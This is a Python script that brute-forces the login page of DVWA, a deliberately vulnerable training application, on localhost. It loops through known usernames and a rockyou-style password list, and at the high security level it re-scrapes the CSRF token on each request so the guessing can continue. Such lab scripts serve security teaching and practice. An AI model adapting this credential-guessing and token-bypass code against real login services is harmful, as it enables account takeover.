import requests
import re
import sys

localhost = "localhost"  
DVWA_URL = f"http://{localhost}/DVWA"
USER_LIST = ["admin", "gordonb", "pablo", "1337", "smithy"]
PASS_FILE = "test_rockyou.txt"

session = requests.Session()

def get_token(content):
    match = re.search(r"name='user_token' value='([a-f0-9]+)'", content)
    return match.group(1) if match else None

def login():
    print("[*] Logging in...")
    res = session.get(f"{DVWA_URL}/login.php")
    token = get_token(res.text)
    
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }
    res = session.post(f"{DVWA_URL}/login.php", data=login_data)
    if "You have logged in" in res.text:
        print("[+] Login successful!")
        return True
    print("[-] Login failed!")
    return False

def set_security(level):
    res = session.get(f"{DVWA_URL}/security.php")
    token = get_token(res.text)
    
    data = {"security": level, "seclev_submit": "Submit", "user_token": token}
    session.post(f"{DVWA_URL}/security.php", data=data)
    if session.cookies.get("security") == level:
        print(f"[+] Security level set to: {level.upper()}")
    else:
        session.cookies.set("security", level, domain=localhost)

def brute_force(level):
    base_url = f"{DVWA_URL}/vulnerabilities/brute/"
    
    res = session.get(base_url)
    current_token = get_token(res.text)

    for user in USER_LIST:
        print(f"[*] Attacking user: {user}")
        try:
            with open(PASS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for password in f:
                    password = password.strip()
                    
                    params = {
                        "username": user,
                        "password": password,
                        "Login": "Login"
                    }
                    
                    if level in ["high"]:
                        if not current_token:
                            print("[-] Error: Unable to retrieve token!")
                            break
                        params["user_token"] = current_token

                    res = session.get(base_url, params=params)
                    
                    if level in ["high"]:
                        current_token = get_token(res.text)

                    if "Welcome to the password protected area" in res.text:
                        print(f"[!] SUCCESS: {user} | {password}")
                        break

        except FileNotFoundError:
            print(f"[-] Could not find file {PASS_FILE}")
            return

if __name__ == "__main__":
    if login():
        target_level = input("Enter level (low/medium/high): ").lower()
        set_security(target_level)
        brute_force(target_level)